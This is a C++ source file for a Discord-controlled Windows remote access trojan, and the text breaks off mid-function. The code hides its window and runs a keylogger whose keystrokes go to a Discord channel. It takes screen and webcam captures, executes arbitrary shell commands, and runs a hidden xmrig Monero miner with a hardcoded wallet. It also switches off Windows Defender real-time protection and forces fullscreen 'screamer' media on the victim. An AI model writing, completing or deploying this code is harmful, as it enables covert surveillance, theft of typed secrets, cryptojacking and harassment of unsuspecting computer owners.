#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "libcurl.lib")

#include <windows.h>
#include <shlobj.h>
#include <combaseapi.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <winreg.h>
#include <TlHelp32.h>
#include <shellapi.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <curl/curl.h>

#include <opencv2/opencv.hpp>
#include <nlohmann/json.hpp>
#include <dpp/dpp.h>

#include <filesystem>
#include <fstream>
#include <sstream>
#include <mutex>
#include <thread>
#include <vector>
#include <map>
#include <set>
#include <atomic>
#include <chrono>
#include <string>
#include <algorithm>
#include <cctype>



#pragma comment(lib, "dpp.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "crypt32.lib")

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

static std::wstring Utf8ToWide(const std::string& str) {
    if (str.empty()) return L"";
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size_needed);
    return wstr;
}

// Объявления всех функций (функций бота, съемки экрана, обработки OpenCV и т.д.) — оставляем без изменений:
void EnsureAutostartShortcut();
std::string execute_command(const std::string& cmd);
std::string getLocalIP();
std::string getSystemInfo();
void send_long_message(dpp::cluster* bot, dpp::snowflake cid, const std::string& message);
void edit_long_message(dpp::cluster* bot, dpp::snowflake cid, dpp::snowflake mid, const std::string& message);
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp);
bool IsAdmin();
BOOL WINAPI CtrlHandler(DWORD ctrl_type);
std::string getPublicIP();
std::string getCPUModel();
std::string getGPUModel();
bool hasWebcam();
std::string getCountry();
std::map<std::string, std::string> parseSystemInfo(const std::string& systeminfo);
std::pair<std::string, std::string> extractOSVersionAndEdition(const std::string& osname);
std::string pad(const std::string& s, size_t width);
bool fileExists(const std::string& filename);
void start_xmrig(int percent);
void stop_xmrig();
DWORD WINAPI KeylogThread(LPVOID lpParam);
void setVolume(float level);
void manageAntivirus(bool enable);
void execute_flags(const std::vector<std::string>& flags, const dpp::message_create_t& event);
void scremer(const std::string& filename, int duration, float volume, const dpp::message_create_t& event, const std::vector<std::string>& flags);
void executeCommand(const std::string& command, const std::vector<std::string>& flags, const dpp::message_create_t& event);
std::pair<std::string, std::vector<std::string>> parse_command(const std::string& content);
size_t countryWriteCallback(void* contents, size_t size, size_t nmemb, void* userp);

struct MesDialogParams {
    std::string messageText;
    dpp::snowflake authorId;
    dpp::cluster* bot;
    dpp::snowflake channelId;
};

LRESULT CALLBACK MesDialogProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit = NULL;
    static HWND hButton = NULL;
    static HWND hStatic = NULL;
    if (uMsg == WM_CREATE) {
        CREATESTRUCTW* cs = reinterpret_cast<CREATESTRUCTW*>(lParam);
        MesDialogParams* params = reinterpret_cast<MesDialogParams*>(cs->lpCreateParams);
        std::wstring messageW = Utf8ToWide(params->messageText);
        hStatic = CreateWindowExW(
            0, L"STATIC", messageW.c_str(),
            WS_CHILD | WS_VISIBLE,
            10, 10, 480, 30,
            hwnd, NULL, GetModuleHandle(NULL), NULL
        );
        hEdit = CreateWindowExW(
            0, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            10, 50, 480, 30,
            hwnd, reinterpret_cast<HMENU>(1001), GetModuleHandle(NULL), NULL
        );
        hButton = CreateWindowExW(
            0, L"BUTTON", L"Send",
            WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
            210, 100, 80, 30,
            hwnd, reinterpret_cast<HMENU>(1002), GetModuleHandle(NULL), NULL
        );
        return 0;
    }
    else if (uMsg == WM_COMMAND) {
        if (LOWORD(wParam) == 1002) {
            wchar_t wbuffer[512];
            GetWindowTextW(hEdit, wbuffer, _countof(wbuffer));
            std::wstring replyW(wbuffer);
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, replyW.c_str(), (int)replyW.size(), NULL, 0, NULL, NULL);
            std::string userReply(size_needed, 0);
            WideCharToMultiByte(CP_UTF8, 0, replyW.c_str(), (int)replyW.size(), &userReply[0], size_needed, NULL, NULL);
            MesDialogParams* params = reinterpret_cast<MesDialogParams*>(GetWindowLongPtrW(hwnd, GWLP_USERDATA));
            if (params && !userReply.empty()) {
                std::string replyMessage = "Reply:" + userReply;
                params->bot->message_create(dpp::message(params->channelId, replyMessage));
            }
            DestroyWindow(hwnd);
            return 0;
        }
    }
    else if (uMsg == WM_CLOSE) {
        DestroyWindow(hwnd);
        return 0;
    }
    else if (uMsg == WM_DESTROY) {
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, uMsg, wParam, lParam);
}

void ShowMesDialog(MesDialogParams* params) {
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = MesDialogProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"MesDialogClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wc);

    const int winWidth = 500;
    const int winHeight = 180;
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int posX = (screenW - winWidth) / 2;
    int posY = (screenH - winHeight) / 2;

    HWND hwnd = CreateWindowExW(
        0, L"MesDialogClass", L"Message",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        posX, posY, winWidth, winHeight,
        NULL, NULL, GetModuleHandle(NULL), params
    );
    SetWindowLongPtrW(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(params));

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
}

static dpp::cluster* bot_ptr = nullptr;
static dpp::snowflake channel_id = 0;
static const std::string MONERO_WALLET =
"41pWoyMxSYoD6x9umWYLXL2hBqN9rdHGE68r1DR8Wrqa1CgzzGggF1wX3yFZXU6EKNPasqDYTPuAaE4JHbKg1DH59EFK8Vt";
static bool keylog_active = false;
static std::string keylog_buffer;
static std::mutex keylog_mutex;
static dpp::snowflake keylog_message_id = 0;
static bool shell_session_active = false;
static std::atomic<bool> awaiting_close{ false };
static dpp::snowflake awaiting_user = 0;
static std::set<dpp::snowflake> awaiting_mes_replies;
static PROCESS_INFORMATION xmrigProc = { 0 };
static std::atomic<bool> xmrigRunning{ false };

std::string GetAppDataPath() {
    PWSTR path;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &path))) {
        std::wstring wpath(path);
        CoTaskMemFree(path);
        return std::string(wpath.begin(), wpath.end());
    }
    return "";
}

std::string execute_command(const std::string& cmd) {
    std::string result;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (pipe) {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        _pclose(pipe);
    }
    return result;
}

std::string getLocalIP() {
    std::string ipconfig_output = execute_command("ipconfig");
    size_t pos = ipconfig_output.find("IPv4 Address");
    if (pos != std::string::npos) {
        pos = ipconfig_output.find(":", pos) + 2;
        size_t end = ipconfig_output.find("\n", pos);
        return ipconfig_output.substr(pos, end - pos);
    }
    return "Unknown";
}

std::string getSystemInfo() {
    return execute_command("systeminfo");
}

void send_long_message(dpp::cluster* bot, dpp::snowflake cid, const std::string& message) {
    const size_t max_length = 1900;
    if (message.length() <= max_length) {
        bot->message_create(dpp::message(cid, "```" + message + "```"));
        return;
    }
    size_t start = 0;
    while (start < message.length()) {
        size_t end = start + max_length;
        if (end > message.length()) end = message.length();
        std::string part = message.substr(start, end - start);
        bot->message_create(dpp::message(cid, "```" + part + "```"));
        start = end;
    }
}

void edit_long_message(dpp::cluster* bot, dpp::snowflake cid, dpp::snowflake mid, const std::string& message) {
    const size_t max_length = 1900;
    if (message.length() <= max_length) {
        dpp::message msg;
        msg.id = mid;
        msg.channel_id = cid;
        msg.content = "```" + message + "```";
        bot->message_edit(msg);
        return;
    }
    size_t start = 0;
    while (start < message.length()) {
        size_t end = start + max_length;
        if (end > message.length()) end = message.length();
        std::string part = message.substr(start, end - start);
        dpp::message msg;
        msg.id = mid;
        msg.channel_id = cid;
        msg.content = "```" + part + "```";
        bot->message_edit(msg);
        start = end;
    }
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t total = size * nmemb;
    std::string* str = static_cast<std::string*>(userp);
    str->append(static_cast<char*>(contents), total);
    return total;
}

bool IsAdmin() {
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    if (!AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        return false;
    }
    BOOL isAdmin = FALSE;
    if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
        isAdmin = FALSE;
    }
    FreeSid(AdministratorsGroup);
    return isAdmin != 0;
}

BOOL WINAPI CtrlHandler(DWORD ctrl_type) {
    if (ctrl_type == CTRL_CLOSE_EVENT || ctrl_type == CTRL_LOGOFF_EVENT || ctrl_type == CTRL_SHUTDOWN_EVENT) {
        if (bot_ptr) {
            bot_ptr->message_create(dpp::message(channel_id, "```Program closing or system shutting down.```"));
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        ExitProcess(0);
        return TRUE;
    }
    return FALSE;
}

std::string getPublicIP() {
    CURL* curl = curl_easy_init();
    if (!curl) return "Unknown";
    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return (res != CURLE_OK || response.empty()) ? "Unknown" : response;
}

std::string getCPUModel() {
    std::string cpuModel = "Unknown";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL,
            (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            cpuModel = buffer;
        }
        RegCloseKey(hKey);
    }
    return cpuModel;
}

std::string getGPUModel() {
    std::string gpuModel = "Unknown";
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    if (SUCCEEDED(CoInitializeEx(0, COINIT_MULTITHREADED))) {
        if (SUCCEEDED(CoCreateInstance(__uuidof(WbemLocator), 0, CLSCTX_INPROC_SERVER,
            __uuidof(IWbemLocator), (LPVOID*)&pLoc))) {
            if (SUCCEEDED(pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"),
                NULL, NULL, 0, NULL, 0, 0, &pSvc))) {
                if (SUCCEEDED(pSvc->ExecQuery(bstr_t("WQL"),
                    bstr_t("SELECT * FROM Win32_VideoController"),
                    WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                    NULL, &pEnumerator))) {
                    IWbemClassObject* pclsObj = NULL;
                    ULONG uReturn = 0;
                    if (SUCCEEDED(pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn)) && uReturn) {
                        VARIANT vtProp;
                        if (SUCCEEDED(pclsObj->Get(L"Name", 0, &vtProp, 0, 0))) {
                            gpuModel = _com_util::ConvertBSTRToString(vtProp.bstrVal);
                            VariantClear(&vtProp);
                        }
                        pclsObj->Release();
                    }
                    pEnumerator->Release();
                }
                pSvc->Release();
            }
            pLoc->Release();
        }
        CoUninitialize();
    }
    return gpuModel;
}

bool hasWebcam() {
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    bool found = false;
    if (SUCCEEDED(CoInitializeEx(0, COINIT_MULTITHREADED))) {
        if (SUCCEEDED(CoCreateInstance(__uuidof(WbemLocator), 0, CLSCTX_INPROC_SERVER,
            __uuidof(IWbemLocator), (LPVOID*)&pLoc))) {
            if (SUCCEEDED(pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"),
                NULL, NULL, 0, NULL, 0, 0, &pSvc))) {
                if (SUCCEEDED(pSvc->ExecQuery(bstr_t("WQL"),
                    bstr_t("SELECT * FROM Win32_PnPEntity WHERE ClassGuid='{36fc9e60-c465-11cf-8056-444553540000}'"),
                    WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                    NULL, &pEnumerator))) {
                    IWbemClassObject* pclsObj = NULL;
                    ULONG uReturn = 0;
                    while (pEnumerator && !found) {
                        if (SUCCEEDED(pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn)) && uReturn) {
                            VARIANT vtProp;
                            if (SUCCEEDED(pclsObj->Get(L"Name", 0, &vtProp, 0, 0))) {
                                std::string name = _com_util::ConvertBSTRToString(vtProp.bstrVal);
                                if (name.find("Camera") != std::string::npos ||
                                    name.find("Webcam") != std::string::npos) {
                                    found = true;
                                }
                                VariantClear(&vtProp);
                            }
                            pclsObj->Release();
                        }
                        else break;
                    }
                    pEnumerator->Release();
                }
                pSvc->Release();
            }
            pLoc->Release();
        }
        CoUninitialize();
    }
    return found;
}

std::map<std::string, std::string> parseSystemInfo(const std::string& systeminfo) {
    std::map<std::string, std::string> info;
    std::istringstream iss(systeminfo);
    std::string line;
    while (std::getline(iss, line)) {
        size_t pos = line.find(":");
        if (pos != std::string::npos) {
            std::string key = line.substr(0, pos);
            std::string value = line.substr(pos + 1);
            key.erase(0, key.find_first_not_of(" \t"));
            key.erase(key.find_last_not_of(" \t") + 1);
            value.erase(0, value.find_first_not_of(" \t"));
            value.erase(value.find_last_not_of(" \t") + 1);
            info[key] = value;
        }
    }
    return info;
}

std::pair<std::string, std::string> extractOSVersionAndEdition(const std::string& osname) {
    size_t pos = osname.find("Windows");
    if (pos != std::string::npos) {
        pos += 8;
        while (pos < osname.size() && isspace(static_cast<unsigned char>(osname[pos]))) pos++;
        size_t end = pos;
        while (end < osname.size() && (isdigit(static_cast<unsigned char>(osname[end])) || osname[end] == '.')) end++;
        std::string version = osname.substr(pos, end - pos);
        pos = end;
        while (pos < osname.size() && isspace(static_cast<unsigned char>(osname[pos]))) pos++;
        size_t edition_end = osname.find(" ", pos);
        std::string edition = (edition_end != std::string::npos)
            ? osname.substr(pos, edition_end - pos)
            : osname.substr(pos);
        return { version, edition };
    }
    return { "Unknown", "Unknown" };
}

std::string pad(const std::string& s, size_t width) {
    if (s.length() >= width) return s.substr(0, width);
    return s + std::string(width - s.length(), ' ');
}

bool fileExists(const std::string& filename) {
    std::ifstream file(filename);
    return file.good();
}

void start_xmrig(int percent) {
    if (xmrigRunning) return;

    unsigned int cores = std::thread::hardware_concurrency();
    if (cores == 0) cores = 1;
    int threadCount = std::max(1, static_cast<int>((cores * percent + 99) / 100));

    std::filesystem::path exePath;
    {
        char pathBuf[MAX_PATH];
        GetModuleFileNameA(NULL, pathBuf, MAX_PATH);
        exePath = std::filesystem::path(pathBuf).parent_path() / "Requirements" / "xmrig.exe";
    }
    if (!std::filesystem::exists(exePath)) {
        send_long_message(bot_ptr, channel_id, "Error: xmrig.exe not found in Requirements folder.");
        return;
    }

    std::string cmd = "\"" + exePath.string() + "\" --url pool.supportxmr.com:3333 --user " +
        MONERO_WALLET + " --pass x --threads " + std::to_string(threadCount);

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(
        NULL,
        const_cast<char*>(cmd.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        send_long_message(bot_ptr, channel_id, "Error: Failed to start xmrig.exe.");
        return;
    }

    xmrigProc = pi;
    xmrigRunning = true;
    send_long_message(bot_ptr, channel_id, "xmrig started with " + std::to_string(threadCount) + " thread(s).");
}

void stop_xmrig() {
    if (!xmrigRunning) {
        send_long_message(bot_ptr, channel_id, "Miner is not running.");
        return;
    }
    TerminateProcess(xmrigProc.hProcess, 0);
    CloseHandle(xmrigProc.hProcess);
    CloseHandle(xmrigProc.hThread);
    xmrigRunning = false;
    send_long_message(bot_ptr, channel_id, "xmrig stopped.");
}

DWORD WINAPI KeylogThread(LPVOID lpParam) {
    std::vector<std::pair<std::string, std::string>> console_lines(15, { "", "" });
    while (keylog_active) {
        std::string raw_keys, interpreted_text;
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                std::string key_str;
                if (key >= 'A' && key <= 'Z') {
                    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    key_str = shift ? std::string(1, (char)key) : std::string(1, (char)(key + 32));
                    raw_keys += shift ? "[shift]" + std::string(1, (char)key) : std::string(1, (char)key);
                    interpreted_text += key_str;
                }
                else if (key == VK_SPACE) {
                    raw_keys += "[space]";
                    interpreted_text += " ";
                }
                else if (key == VK_RETURN) {
                    raw_keys += "[enter]";
                    interpreted_text += "\n";
                }
                else if (key >= VK_F1 && key <= VK_F12) {
                    raw_keys += "[F" + std::to_string(key - VK_F1 + 1) + "]";
                }
                else {
                    raw_keys += "[" + std::to_string(key) + "]";
                }
            }
        }
        if (!raw_keys.empty()) {
            console_lines.erase(console_lines.begin());
            console_lines.push_back({ interpreted_text, raw_keys });
            std::string console_output = " _____________________________________________________\n";
            for (const auto& line : console_lines) {
                console_output += "| " + pad(line.first, 25) + "| " + pad(line.second, 25) + "|\n";
            }
            console_output += "|_____________________________________________________|";
            {
                std::lock_guard<std::mutex> lock(keylog_mutex);
                keylog_buffer = console_output;
            }
            edit_long_message(bot_ptr, channel_id, keylog_message_id, keylog_buffer);
        }
        Sleep(1000);
    }
    return 0;
}

void setVolume(float level) {
    CoInitialize(NULL);
    IMMDeviceEnumerator* pEnumerator = nullptr;
    IMMDevice* pDevice = nullptr;
    IAudioEndpointVolume* pEndpointVolume = nullptr;
    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator))) {
        if (SUCCEEDED(pEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice))) {
            if (SUCCEEDED(pDevice->Activate(__uuidof(IAudioEndpointVolume),
                CLSCTX_INPROC_SERVER, NULL, (void**)&pEndpointVolume))) {
                pEndpointVolume->SetMasterVolumeLevelScalar(level, NULL);
                pEndpointVolume->Release();
            }
            pDevice->Release();
        }
        pEnumerator->Release();
    }
    CoUninitialize();
}

void manageAntivirus(bool enable) {
    if (!IsAdmin()) {
        send_long_message(bot_ptr, channel_id, "Error: Not running as administrator.");
        return;
    }
    std::string cmd = enable
        ? "Set-MpPreference -DisableRealtimeMonitoring $false"
        : "Set-MpPreference -DisableRealtimeMonitoring $true";
    FILE* pipe = _popen(("powershell -Command \"" + cmd + "\"").c_str(), "r");
    if (pipe) {
        char buffer[128];
        std::string result;
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        _pclose(pipe);
        send_long_message(bot_ptr, channel_id, "Antivirus " + std::string(enable ? "enabled" : "disabled") + ".");
    }
}

void execute_flags(const std::vector<std::string>& flags, const dpp::message_create_t& event) {
    for (const auto& flag : flags) {
        if (flag == "-screenshot") {
            auto future = std::async(std::launch::async, [&]() {
                int width = GetSystemMetrics(SM_CXSCREEN);
                int height = GetSystemMetrics(SM_CYSCREEN);
                HDC hScreen = GetDC(NULL);
                HDC hMemory = CreateCompatibleDC(hScreen);
                HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
                SelectObject(hMemory, hBitmap);
                BitBlt(hMemory, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
                cv::Mat mat(height, width, CV_8UC4);
                GetBitmapBits(hBitmap, mat.total() * mat.elemSize(), mat.data);
                cv::imwrite("screenshot_mid.jpg", mat);
                DeleteObject(hBitmap);
                DeleteDC(hMemory);
                ReleaseDC(NULL, hScreen);
                });
            future.get();
            if (!fileExists("screenshot_mid.jpg")) {
                send_long_message(bot_ptr, channel_id, "Error: Failed to save screenshot.");
                return;
            }
            dpp::message msg(channel_id, "");
            msg.add_file("screenshot_mid.jpg", dpp::utility::read_file("screenshot_mid.jpg"), "image/jpeg");
            bot_ptr->message_create(msg, [](const dpp::confirmation_callback_t& callback) {
                if (!callback.is_error()) std::remove("screenshot_mid.jpg");
                });
        }
        else if (flag == "-camsnap") {
            auto future = std::async(std::launch::async, [&]() {
                cv::VideoCapture cap(0);
                if (!cap.isOpened()) return;
                cv::Mat frame;
                cap >> frame;
                if (frame.empty()) return;
                cv::imwrite("camsnap_mid.jpg", frame);
                cap.release();
                });
            future.get();
            if (!fileExists("camsnap_mid.jpg")) {
                send_long_message(bot_ptr, channel_id, "Error: Failed to save camsnap.");
                return;
            }
            dpp::message msg(channel_id, "");
            msg.add_file("camsnap_mid.jpg", dpp::utility::read_file("camsnap_mid.jpg"), "image/jpeg");
            bot_ptr->message_create(msg, [](const dpp::confirmation_callback_t& callback) {
                if (!callback.is_error()) std::remove("camsnap_mid.jpg");
                });
        }
    }
}

void scremer(const std::string& filename, int duration, float volume, const dpp::message_create_t& event, const std::vector<std::string>& flags) {
    auto send_message = [&](const std::string& msg) {
        send_long_message(bot_ptr, channel_id, msg);
        };

    if (!std::filesystem::exists(filename)) {
        send_message("Error: File does not exist.");
        return;
    }

    std::string extension = filename.substr(filename.find_last_of(".") + 1);
    std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

    setVolume(volume);

    if (extension == "jpg" || extension == "png" || extension == "bmp") {
        try {
            cv::Mat img = cv::imread(filename);
            if (!img.empty()) {
                cv::namedWindow("Screamer", cv::WINDOW_NORMAL);
                cv::setWindowProperty("Screamer", cv::WND_PROP_FULLSCREEN, cv::WINDOW_FULLSCREEN);
                cv::imshow("Screamer", img);

                cv::waitKey(100);
                HWND hwnd = FindWindowA(NULL, "Screamer");
                if (hwnd) {
                    SetForegroundWindow(hwnd);
                    SetActiveWindow(hwnd);
                    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
                }

                if (!flags.empty()) {
                    std::thread([flags, event]() {
                        std::this_thread::sleep_for(std::chrono::milliseconds(500));
                        execute_flags(flags, event);
                        }).detach();
                }

                cv::waitKey(duration * 1000);
                cv::destroyWindow("Screamer");
                cv::waitKey(1);

                setVolume(1.0f);
                send_message("Image displayed for " + std::to_string(duration) +
                    " seconds at volume " + std::to_string(static_cast<int>(volume * 100)) + "%.");
            }
            else {
                send_message("Error: Failed to load image.");
                setVolume(1.0f);
            }
        }
        catch (const cv::Exception& e) {
            send_message("OpenCV error: " + std::string(e.what()));
            setVolume(1.0f);
        }
        catch (...) {
            send_message("Unknown error while processing image.");
            setVolume(1.0f);
        }
    }
    else if (extension == "mp4" || extension == "avi" || extension == "mov") {
        try {
            cv::VideoCapture cap(filename);
            if (!cap.isOpened()) {
                send_message("Error: Failed to open video.");
                setVolume(1.0f);
                return;
            }

            double fps = cap.get(cv::CAP_PROP_FPS);
            if (fps <= 0) fps = 30;
            int delay = static_cast<int>(1000 / fps);

            cv::namedWindow("Screamer", cv::WINDOW_NORMAL);
            cv::setWindowProperty("Screamer", cv::WND_PROP_FULLSCREEN, cv::WINDOW_FULLSCREEN);
            cv::waitKey(100);
            HWND hwnd = FindWindowA(NULL, "Screamer");
            if (hwnd) {
                SetForegroundWindow(hwnd);
                SetActiveWindow(hwnd);
                SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            }

            if (!flags.empty()) {
                std::thread([flags, event]() {
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                    execute_flags(flags, event);
                    }).detach();
            }

            std::string audio_cmd = "start /min wmplayer \"" + filename + "\"";
            system(audio_cmd.c_str());

            cv::Mat frame;
            auto start_time = std::chrono::steady_clock::now();
            while (true) {
                cap >> frame;
                if (frame.empty()) break;
                cv::imshow("Screamer", frame);
                int key = cv::waitKey(delay);
                if (key >= 0) break;
                auto current_time = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
                if (elapsed >= duration) break;
            }

            cv::destroyWindow("Screamer");
            cv::waitKey(1);
            system("taskkill /im wmplayer.exe /f >nul 2>&1");
            cap.release();

            setVolume(1.0f);
            send_long_message(bot_ptr, channel_id, "Video played for " + std::to_string(duration) +
                " seconds at volume " + std::to_string(static_cast<int>(volume * 100)) + "%.");
        }
        catch (const cv::Exception& e) {
            send_long_message(bot_ptr, channel_id, "OpenCV error: " + std::string(e.what()));
            system("taskkill /im wmplayer.exe /f >nul 2>&1");
            setVolume(1.0f);
        }
        catch (...) {
            send_long_message(bot_ptr, channel_id, "Unknown error while processing video.");
            system("taskkill /im wmplayer.exe /f >nul 2>&1");
            setVolume(1.0f);
        }
    }
    else {
        send_long_message(bot_ptr, channel_id, "Error: Unsupported file format.");
        setVolume(1.0f);
    }

    std::remove(filename.c_str());
}

void executeCommand(const std::string& command, const std::vector<std::string>& flags, const dpp::message_create_t& event) {
    auto send_message = [&](const std::string& msg) {
        send_long_message(bot_ptr, channel_id, msg);
        };

    std::vector<std::string> excluded_commands = { "shutdown", "reboot", "kill", "bsod" };
    bool has_flags = !flags.empty() &&
        (std::find(excluded_commands.begin(), excluded_commands.end(), command) == excluded_commands.end());

    if (command == "screenshot") {
        auto future = std::async(std::launch::async, [&]() {
            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);
            HDC hScreen = GetDC(NULL);
            HDC hMemory = CreateCompatibleDC(hScreen);
            HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
            SelectObject(hMemory, hBitmap);
            BitBlt(hMemory, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
            cv::Mat mat(height, width, CV_8UC4);
            GetBitmapBits(hBitmap, mat.total() * mat.elemSize(), mat.data);
            cv::imwrite("screenshot.jpg", mat);
            DeleteObject(hBitmap);
            DeleteDC(hMemory);
            ReleaseDC(NULL, hScreen);
            });
        future.get();
        if (!fileExists("screenshot.jpg")) {
            send_message("Error: Failed to save screenshot.");
        }
        else {
            dpp::message msg(channel_id, "");
            msg.add_file("screenshot.jpg", dpp::utility::read_file("screenshot.jpg"), "image/jpeg");
            bot_ptr->message_create(msg, [](const dpp::confirmation_callback_t& callback) {
                if (!callback.is_error()) std::remove("screenshot.jpg");
                });
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "listcommand") {
        std::string commands = "Available commands:\n"
            "{ !screenshot }\n"
            "{ !camsnap }\n"
            "{ !upload }\n"
            "{ !update }\n"
            "{ !admin }\n"
            "{ !shell }\n"
            "{ !!shell }\n"
            "{ !shelladmin }\n"
            "{ !!shelladmin }\n"
            "{ !gps }\n"
            "{ !kill }\n"
            "{ !bsod }\n"
            "{ !keylog }\n"
            "{ !stopkey }\n"
            "{ !shutdown }\n"
            "{ !reboot }\n"
            "{ !lockscreen }\n"
            "{ !process }\n"
            "{ !whererat }\n"
            "{ !scremer }\n"
            "{ !changewall }\n"
            "{ !volume }\n"
            "{ !antivirus }\n"
            "{ !miner }\n"
            "{ !minerstop }\n"
            "{ !listcommand }\n"
            "{ !clone }\n"
            "{ !endtask }\n"
            "{ !?Admin }\n"
            "{ !?webcam }";
        send_message(commands);
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
    }
    else if (command == "miner") {
        if (!flags.empty()) {
            int percent = 0;
            for (const auto& f : flags) {
                if (f.size() > 1 && f.back() == '%') {
                    try {
                        percent = std::stoi(f.substr(1, f.size() - 2));
                    }
                    catch (...) {
                        percent = 0;
                    }
                    break;
                }
            }
            if (percent <= 0 || percent > 100) {
                send_message("Error: Specify CPU percentage from 1% to 100%, e.g. !miner -50%");
            }
            else {
                start_xmrig(percent);
            }
        }
        else {
            send_message("Error: Specify CPU load percentage, e.g. !miner -50%");
        }
        if (has_flags) {
            std::thread([flags, event]() {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                execute_flags(flags, event);
                }).detach();
        }
